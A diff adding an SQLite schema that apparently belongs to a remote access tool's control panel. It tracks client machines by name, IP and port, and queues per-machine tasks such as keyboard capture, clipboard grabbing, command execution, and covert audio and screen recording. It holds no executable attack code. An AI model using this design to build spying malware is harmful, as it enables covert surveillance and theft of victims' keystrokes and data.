@@ -1,0 +1,6 @@
+BEGIN TRANSACTION;
+CREATE TABLE audo_file_path (id INTEGER PRIMARY KEY, date_time TEXT, file_path TEXT, file_show NUMERIC, file_lising_date TEXT);
+CREATE TABLE client (uuid TEXT, pc_name TEXT, pc_ip_address TEXT, pc_local_port NUMERIC, pc_random_port NUMERIC, status NUMERIC, last_login TEXT, id INTEGER PRIMARY KEY);
+CREATE TABLE tasks (reboot NUMERIC, shutdown NUMERIC, kill_me NUMERIC, get_keyboard NUMERIC, get_taskmanger NUMERIC, get_clipbord NUMERIC, run_command_line NUMERIC, audio_life_phone , audio_life NUMERIC, audio_record NUMERIC, screen_record_life NUMERIC, screen_record_screnshot NUMERIC, screen_record_video NUMERIC, id INTEGER PRIMARY KEY, uuid TEXT);
+CREATE TABLE video_file_path (id INTEGER PRIMARY KEY, date_time TEXT, file_path TEXT, file_see NUMERIC, file_last_see TEXT);
+COMMIT;
